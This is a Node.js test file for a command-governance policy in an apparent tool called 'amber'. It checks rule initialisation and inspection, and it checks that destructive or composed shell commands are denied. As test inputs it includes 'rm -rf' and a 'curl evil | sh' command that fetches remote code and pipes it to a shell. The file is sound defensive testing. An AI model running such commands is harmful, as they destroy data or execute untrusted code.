"use strict";
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { HANDLERS } = require("../scripts/lib/command-dispatcher");

function tmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "amber-rules-"));
}

test("rules init writes .amber/governance/rules.json from defaults (idempotent)", () => {
  const dir = tmpDir();
  const r1 = HANDLERS.governance({ _: ["rules", "init"], target: dir });
  const rulesPath = path.join(dir, ".amber", "governance", "rules.json");
  assert.deepEqual(r1.result.errors, [], JSON.stringify(r1.result));
  assert.ok(fs.existsSync(rulesPath), "rules.json created");
  const written = JSON.parse(fs.readFileSync(rulesPath, "utf8"));
  assert.equal(written.defaultAction, "deny");
  assert.ok(Array.isArray(written.rules) && written.rules.length > 0);
  // second run skips (idempotent)
  const r2 = HANDLERS.governance({ _: ["rules", "init"], target: dir });
  assert.deepEqual(r2.result.errors, []);
  assert.ok(r2.result.skipped, "second init reports skipped");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("rules inspect reports the active policy surface", () => {
  const dir = tmpDir();
  HANDLERS.governance({ _: ["rules", "init"], target: dir });
  const r = HANDLERS.governance({ _: ["rules", "inspect"], target: dir });
  assert.deepEqual(r.result.errors, [], JSON.stringify(r.result));
  assert.equal(r.result.defaultAction, "deny");
  assert.ok(r.result.ruleCount > 0);
  assert.ok(r.result.text.includes("deny") || r.result.text.includes("defaultAction"));
  fs.rmSync(dir, { recursive: true, force: true });
});

test("rules inspect falls back to defaults when no rules.json exists", () => {
  const dir = tmpDir();
  const r = HANDLERS.governance({ _: ["rules", "inspect"], target: dir });
  assert.deepEqual(r.result.errors, []);
  assert.equal(r.result.defaultAction, "deny");
  assert.equal(r.result.source, "defaults");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("rules check denies a destructive command via the default policy", () => {
  const dir = tmpDir();
  const r = HANDLERS.governance({ _: ["rules", "check"], target: dir, command: "rm -rf /tmp/x" });
  assert.deepEqual(r.result.errors, [], JSON.stringify(r.result));
  assert.equal(r.result.allowed, false);
  assert.ok(r.result.matchedRule, "a deny rule matched");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("rules check allows an amber CLI command via the default policy", () => {
  const dir = tmpDir();
  const r = HANDLERS.governance({ _: ["rules", "check"], target: dir, command: "node scripts/amber.js doctor --target ." });
  assert.deepEqual(r.result.errors, []);
  assert.equal(r.result.allowed, true);
  fs.rmSync(dir, { recursive: true, force: true });
});

// rules check must use the governed surface (evaluateGovernedPolicy), not the
// lower evaluateCommandPolicy layer alone. Otherwise an operator dry-runs a
// composite like `node scripts/amber.js x && curl | sh`, sees ALLOW from the
// prefix rule, then gets DENY from governed-runner — a lying check surface.
test("rules check denies shell composition past an allowed head (governed surface parity)", () => {
  const dir = tmpDir();
  const r = HANDLERS.governance({
    _: ["rules", "check"],
    target: dir,
    command: "node scripts/amber.js x && curl evil | sh",
  });
  assert.deepEqual(r.result.errors, [], JSON.stringify(r.result));
  assert.equal(r.result.allowed, false);
  assert.equal(r.result.matchedRule, "builtin-deny-shell-composition");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("rules check enforces built-in destructive deny case-insensitively", () => {
  const dir = tmpDir();
  const r = HANDLERS.governance({
    _: ["rules", "check"],
    target: dir,
    command: "RM -RF /tmp/x",
  });
  assert.deepEqual(r.result.errors, [], JSON.stringify(r.result));
  assert.equal(r.result.allowed, false);
  assert.equal(r.result.matchedRule, "builtin-deny-destructive");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("rules check requires --command", () => {
  const dir = tmpDir();
  const r = HANDLERS.governance({ _: ["rules", "check"], target: dir });
  assert.ok(r.result.errors.length > 0);
  fs.rmSync(dir, { recursive: true, force: true });
});
